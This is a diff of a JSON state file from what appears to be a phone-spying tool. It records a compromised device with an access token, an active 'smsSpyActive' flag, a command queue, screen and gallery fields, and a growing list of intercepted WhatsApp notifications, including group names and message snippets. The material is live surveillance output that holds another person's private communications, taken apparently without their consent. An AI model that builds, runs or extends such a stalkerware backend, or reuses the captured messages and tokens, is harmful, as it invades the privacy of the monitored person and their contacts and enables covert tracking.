@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-CA6D",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "1505d9de1a287ae732b4f22d45e58506",
-    "lastSeen": 1777178160928,
+    "lastSeen": 1777178162960,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:08:43.334Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎84 pesan dari 2 chat",
+        "time": "26/04 12:47",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777178162974
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎84 pesan dari 2 chat",
+        "time": "26/04 12:46",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777178161143
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎Pegasus-X Room (26 pesan): ~ hanma back era",
@@ -4003,22 +4019,6 @@
         "time": "26/04 11:24",
         "pkg": "com.whatsapp",
         "receivedAt": 1777173227002
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎1163 pesan dari 19 chat",
-        "time": "26/04 11:24",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173226985
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝟐𝟐𝟓 𝐀𝐑𝐄𝐀 (61 pesan): ~ jiermeii😳",
-        "content": "my istri🤤",
-        "time": "26/04 11:24",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173226978
       }
     ],
     "galleryPhotos": [],
